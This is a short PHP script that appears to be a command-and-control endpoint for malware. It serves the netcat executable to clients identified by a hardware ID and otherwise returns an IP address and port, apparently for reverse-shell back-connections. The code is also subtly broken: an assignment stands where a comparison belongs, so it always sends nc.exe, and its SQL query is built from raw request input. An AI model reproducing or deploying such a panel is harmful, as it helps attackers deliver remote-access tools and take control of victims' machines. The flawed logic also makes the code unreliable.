<?php
include("config.php");
$hwid = $_GET['c'];
if(strpos($hwid, '\'') !== false){
	die();
}
if($hwid = 'nc'){
	echo file_get_contents('nc.exe');
	die();
}
$sql_bc = mysqli_query($conn, "SELECT ip,port FROM bc WHERE hwid='$hwid'");
if(mysqli_num_rows($sql_bc) > 0){
	$re = mysqli_fetch_assoc($sql_bc);
	$ip = $re['ip'];
	$port = $re['port'];
    echo $ip.'@'.$port;
}
else{
    echo '0';
}
?>